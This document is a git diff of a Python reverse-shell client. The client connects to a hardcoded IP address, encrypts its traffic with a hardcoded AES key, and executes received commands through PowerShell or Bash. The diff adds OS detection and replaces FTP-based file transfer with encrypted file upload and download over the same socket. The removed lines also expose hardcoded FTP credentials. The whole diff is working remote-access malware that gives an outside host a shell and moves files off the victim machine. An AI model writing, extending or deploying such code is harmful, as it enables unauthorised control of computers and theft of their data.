@@ -2,15 +2,12 @@ import socket
 import os
 import subprocess
 import getpass
-from ftplib import FTP
 import time
 from Crypto.Cipher import AES
 from Crypto.Util.Padding import pad,unpad
 
 HOST = "192.168.30.52"
-PORT = 6565
-ftp_username = "Necati"
-ftp_password = "P;F3nj+qXp.N^H8!*=$#kl"
+PORT = 6566
 aes_key = b'o\x802\x0ez\xe0\x8f\x8b\xc7>\xbf\x9fce\x85\xd3'
 
 
@@ -40,6 +37,7 @@ def first_connect(client):
 
 
 def connect():
+    os_name = os.name
     while 1:
         pwd = os.getcwd()
         client.send(encrypt_data(pwd.encode('utf-8')))
@@ -52,11 +50,17 @@ def connect():
                 info("[*] Connection closed !!!",client)
                 break
             elif command.split(" ")[0] == "ftp":
-                
-                stdout = ftp_connect(command)
+                stdout = ftp(command.split(" "),client)
+                time.sleep(0.4)
                 info(stdout,client)
+                time.sleep(0.4)
                 continue
-            stdout = subprocess.check_output(["powershell", "-Command",command])
+            
+            if os_name == "nt":
+                stdout = subprocess.check_output(["powershell.exe", "-Command",command],shell=True)
+            elif os_name == "posix":
+                stdout = subprocess.check_output(["/bin/bash", "-c",command],shell=False)
+                
         except :
             stdout = b"\033[32m[*] Command Not Found.\033[0m\n"
             
@@ -68,33 +72,47 @@ def connect():
 
 
 
-def ftp_connect(command):
-    try:
-        command_parts = command.split()
-        command_type = command_parts[1]
-        filename = command_parts[2]
-        session = FTP()
-        session.connect(HOST)
-        session.login(user=ftp_username, passwd=ftp_password)
-        
-        if command_type == "-d":
-            # Upload file
-            with open(filename, 'rb') as f:
-                session.storbinary(f'STOR {filename}', f)
-            return f"[*] {filename} downloaded successfully."
-            
-        elif command_type == "-u":
-            # Download file
-            with open(filename, 'wb') as f:
-                session.retrbinary(f'RETR {filename}', f.write)
-            return f"[*] {filename}  uploaded successfully."
-            
-        else:
-            return "[*] Invalid option !!!"
-                
-    except Exception as e:
-        return f"Error: {e}"
+def ftp(command,client):
+    tip = command[1]
+    file = command[2]
 
+    
+
+    def download(file,client):
+        size = int(decrypt_data(client.recv(4096)).decode('utf-8'))
+        if size == -1:
+            return "[*] Not found !!!"
+        client.send(b"ready")
+        chunk = decrypt_data(client.recv(4096))
+        while os.path.exists(file) : 
+            file += '(new)'
+        with open(file,'ab') as f:
+            while chunk != b"\n\r":
+                f.write(chunk)
+                chunk = decrypt_data(client.recv(4096))
+        return "[*] Data uploaded successful."
+
+    def upload(file,client):
+        try:
+            with open(f"./{file}",'rb') as f:
+                client.send(encrypt_data(b'1'))
+                client.recv(4096)
+                chunk = f.read(4096)
+                while chunk :
+                    client.send(encrypt_data(chunk))
+                    chunk = f.read(4096)
+                client.send(encrypt_data(b"\n\r"))
+            return "[*] Data downloaded successful."
+        except:
+            client.send(encrypt_data(b'-1'))
+            return "[*] Not found !!!"
+            
+    if tip == "-u":
+        return download(file,client)
+    elif tip == "-d":
+        return upload(file,client)
+    else :
+        return "[*] Wrong command !!!"  
 
 
 
